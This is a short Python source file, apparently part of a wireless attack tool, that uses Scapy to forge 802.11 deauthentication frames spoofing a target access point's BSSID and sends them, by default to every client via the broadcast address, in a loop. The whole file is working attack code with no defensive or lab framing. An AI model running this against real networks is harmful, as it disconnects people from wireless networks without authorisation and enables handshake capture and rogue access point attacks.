from scapy.all import Dot11, Dot11Deauth, RadioTap, sendp


class Deauth:

    BROADCAST = "FF:FF:FF:FF:FF:FF"

    def send(
        self, iface: str, target_bssid: str, client: str | None, packets: int
    ) -> None:
        target_bssid = target_bssid.upper()
        client = client.upper() if client else self.BROADCAST

        dot11 = Dot11(
            type=0, subtype=12, addr1=client, addr2=target_bssid, addr3=target_bssid
        )
        packet = RadioTap() / dot11 / Dot11Deauth(reason=7)

        for _ in range(packets):
            sendp(packet, iface=iface, verbose=0)
